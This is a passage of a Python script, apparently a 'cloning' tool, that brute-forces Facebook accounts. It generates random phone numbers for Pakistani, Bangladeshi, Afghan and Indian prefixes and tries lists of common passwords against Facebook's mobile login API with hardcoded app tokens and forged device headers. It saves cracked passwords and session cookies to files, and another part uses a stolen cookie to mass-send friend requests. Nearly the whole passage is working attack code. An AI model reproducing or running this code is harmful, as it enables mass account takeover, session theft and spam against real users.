                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'cpl': 'true',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'device_based_login_password',
'error_detail_type': 'button_with_disabled',
'source': 'register_api',
'email': ids,
'password': pas,
'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'generate_session_cookies': '1',
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': code1,
'client_country_code': loc1,
'method': 'auth.login',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'X-FB-Net-HNI': '20083',
'User-Agent': DOD_UA_2(),
'X-FB-Client-IP': 'True',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-SIM-HNI': '37460',
'X-Tigon-Is-Retry': 'False',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Server-Cluster': 'True',
'Connection': 'keep-alive',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Host': 'graph.facebook.com',
'X-FB-Connection-Bandwidth': '80025933',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'Accept-Encoding': 'gzip, deflate',
'X-FB-Connection-Type': 'MOBILE.LTE',
'Content-Type': 'application/x-www-form-urlencoded'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;32m[MUGHAL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/DOD/MUGHAL-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/DOD/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r \033[1;31m[MUGHAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DOD/MUGHAL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            time.sleep(20)

def DOD_UA_3():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi'])}]"
    ua = random.choice("Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/'+fbrv+';FBPN/com.facebook.katana;FBLC/'+fblc+'/;FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]")
    return ua
def ffb3(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r \033[1;37m[MUGHAL-M3] %s |OK:%s'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code3,'client_country_code': loc3,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': DOD_UA_3(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;32m[MUGHAL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/DOD/MUGHAL-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/DOD/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r \033[1;31m[MUGHAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DOD/MUGHAL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            time.sleep(20)

def ffb4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r\033[1;37m [MUGHAL-M4] %s |OK:%s'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code4,'client_country_code': loc4,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': "[FBAN/Orca-Android;FBAV/900.0.0.54.730;FBBV/53784882;[FBAN/Orca-Android;FBAV/900.0.0.54.730;FBPN/com.facebook.katana;FBLC/en_US;FBBV/53784882;FBCR/Telenor;FBMF/;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]",'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '22'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\033[1;32m [MUGHAL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/DOD/MUGHAL-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/DOD/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r \033[1;31m[MUGHAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DOD/MUGHAL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            time.sleep(20)

def Main_Menu():
    clear()
    print(f' (1)PAK CLONING\n (2)BD CLONING\n (3)AFG CLONING\n INDIA CLONING\n (0)BACK MENU')
    line()
    option=input(f' CHOICE MENU >> ')
    if option in ['1','01']:
        pak()
    if option in ['2','02']:
        bd()
    if option in ['3','03']:
        afg()
    if option in ['4','04']:
        ind()
    if option in ['0','00']:
        menu()
    else:
        line()
    print(f' SELECTED WRONG OPTION')
    time.sleep(2)
    Main_Menu()

def pak():
                user=[]
                clear()
                print(f' EXAMPLE  : 0300,0315,0333,0345');line()
                code = input(f' Enter Code : ')
                clear()
                try:
                        limit = int(input(f' Example : 2000, 3000, 5000, 10000\n Enter Limit : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as MUGHALg1:
                        clear()
                        tl = str(len(user))
                        print(' Total id : \033[1;97m'+tl)
                        print(' Select code :\033[1;97m '+code)
                        print(' DOD Crack Has Been Running \n Use Airplane after 2 minutes')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,'khan khan','khan1122','khan786','khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123','pakistan','pakistan786']
                                MUGHALg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f' The Process Has Completed')
                print(f' TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f' PRESS ENTER TO BACK ')
                menu()
def bd():
                user=[]
                clear()
                print(f' EXAMPLE  : 017,016,018');line()
                code = input(f' Enter Code : ')
                clear()
                try:
                        limit = int(input(f' Example : 2000, 3000, 5000, 10000\n Enter Limit : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as MUGHALg1:
                        clear()

                        tl = str(len(user))
                        print(' \033[1;36m[\033[1;37m+\033[1;36m] \033[0mCloning ids Saved in DOD folder');line()
                        print(' Total id : \033[1;97m'+tl)
                        print(' Select code :\033[1;97m '+code)
                        print(' DOD Crack Has Been Running \n Use Airplane after 2 minutes')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
                                MUGHALg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'  The Process Has Completed')
                print(f'  TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'  PRESS ENTER TO BACK ')
                menu()

def afg():
                user=[]
                clear()
                print(f' Example : 9377,9379,9374');line()
                code = input(f' Enter Code : ')
                clear()
                try:
                        limit = int(input(f' Example  : 2000, 3000, 5000, 10000\n Enter Limit : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as MUGHALg1:
                        clear()

                        tl = str(len(user))
                        print(' \033[1;36m[\033[1;37m+\033[1;36m] \033[0mCloning ids Saved in DOD folder');line()
                        print(' Total id : \033[1;97m'+tl)
                        print(' Select code :\033[1;97m '+code)
                        print(' DOD Crack Has Been Running \n Use Airplane after 2 minutes')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                MUGHALg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f' The Process Has Completed')
                print(f' TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f' PRESS ENTER TO BACK ')
                menu()
def ind():
                user=[]
                clear()
                print(f' EXAMPLE  : 91***,etc');line()
                code = input(f' Enter Code : ')
                clear()
                try:
                        limit = int(input(f' Example : 2000, 3000, 5000, 10000\n Enter Limit : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as MUGHALgg:
                        clear()

                        tl = str(len(user))
                        print(' \033[1;36m[\033[1;37m+\033[1;36m] \033[0mCloning ids Saved in DOD folder');line()
                        print(' Total id : \033[1;97m'+tl)
                        print(' Select code :\033[1;97m '+code)
                        print(' DOD Crack Has Been Running \n Use Airplane after 2 minutes')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','57575751']
                                MUGHALgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f' The Process Has Completed')
                print(f' TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f' PRESS ENTER TO BACK ')
                menu()

def rd(uid,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\r [MUGHAL-RNDM] %s|OK:%s'%(loop,len(ok)));sys.stdout.flush()
        for pas in passlist:
            data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
            head = {'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': "[FBAN/Orca-Android;FBAV/522.0.0.89.172;FBBV/26646702;[FBAN/Orca-Android;FBAV/522.0.0.89.172;FBPN/com.facebook.katana;FBLC/en_US;FBBV/26646702;FBCR/Zong;FBMF/;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]",
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                print(f'\r\033[1;32m [MUGHAL-OK] '+uid+' | '+pas+'\033[1;37m')
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                MUGHAL1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MUGHAL1};{ckkk}"
                open('/sdcard/DOD/MUGHAL-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print(f'\r [MUGHAL-CP] '+uid+' | '+pas+'\033[1;37m')
                open('/sdcard/DOD/MUGHAL-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                cp.append(uid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleeprint(20)
    except Exception as e:
        pass

def filexd():
    clear()
    print(" Requests file put karo")
    line()
    fil = input(' File : ')
    line()
    return open(fil,'r').read().splitlines()
def req(idx,cookies,fb_dtsg,j2,uid):
    try:
        headers = {'authority': 'web.facebook.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://web.facebook.com','referer': 'https://web.facebook.com/','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-full-version-list': '" Not A;Brand";v="99.0.0.0", "Chromium";v="101.0.4951.40"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','viewport-width': '980','x-asbd-id': '129477','x-fb-friendly-name': 'FriendingCometFriendRequestSendMutation','x-fb-lsd': '_HXdQr8kHu0XQKU7XKSGvZ',}        
        data = {
            'av': uid,
            '__user': uid,
            '__a': '1',
            '__req': '2v',
            '__hs': '',
            'dpr': '1',
            '__ccg': 'GOOD',
            '__rev': '',
            '__s': '',
            '__hsi': '',
            '__dyn': '',
            '__csr': '',
            '__comet_req': '15',
            'fb_dtsg': fb_dtsg,
            'jazoest': j2,
            'lsd': '',
            '__spin_r': '',
            '__spin_b': '',
            '__spin_t': '',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'FriendingCometFriendRequestSendMutation',
            'variables': '{"input":{"attribution_id_v2":"ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,unexpected,1687455775544,420893,190055527696468,;SearchCometGlobalSearchDefaultTabRoot.react,comet.search_results.default_tab,unexpected,1687455771503,169129,391724414624676,;SearchCometGlobalSearchDefaultTabRoot.react,comet.search_results.default_tab,tap_search_bar,1687455767259,87694,391724414624676,","friend_requestee_ids":["'+idx+'"],"refs":[null],"source":"profile_button","warn_ack_for_ids":[],"actor_id":"'+uid+'","client_mutation_id":"3"},"scale":1}',
            'server_timestamps': 'true',
            'doc_id': '6355998154485513',}
        post = requests.post('https://web.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
        result = 'success'
    except:
       result = 'Error'
    return result

def cookii():
    clear()
    print(" Jis id par requests bhjni hain uska cookie put ")
    line()
    cookie = input(" Cookies : ")
    cookies = {'cookie' : cookie}
    uid = cookie.split('c_user=')[1].split(';')[0]
    res = requests.get('https://m.facebook.com/', cookies=cookies).text
    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(res)).group(1)
    j2 = re.search('name="jazoest" value="(.*?)"', str(res)).group(1)
    line()
    print(' Cookie Successfully \x1b[1;92m'+uid+' \x1b[1;97m')
    line();time.sleep(2)
    try:
        filee = filexd()
    except Exception as e:
        print(e)
        os.sys.exit()
    try:
        for idz in filee:
            try:
                idx,names = idz.split('|')
            except:
                idx = idz
            opp = req(idx,cookies,fb_dtsg,j2,uid)
            if 'success' in opp:
                print(' Friend request sent successfully\n '+idx)
            else:
                print(' Friend requests fail')
        os.sys.exit()
    except Exception as e:
        print(e)
        os.sys.exit()

W = '\x1b[1;37m'
G = '\x1b[1;32m'
R = '\x1b[1;91m'
S = '\x1b[1;36m'
B = '\x1b[1;34m'
Y = '\x1b[1;33m'
P = '\x1b[1;35m'

cnt=0
cp=0
ok=0
ok1=0
loop=0
died=0
live=0

import os,sys,time,re,uuid,base64,zlib,subprocess
from concurrent.futures import  ThreadPoolExecutor as tpe
try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl')
    import pycurl
    from io import BytesIO
try:import pycurl
except:os.system('pkg uninstall python;pkg install python -y;pip install pycurl')
try:import pycurl
except:print('\n Pycurl Module Error!\n Contact With Owner! ');exit()
import random

def random_ua():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
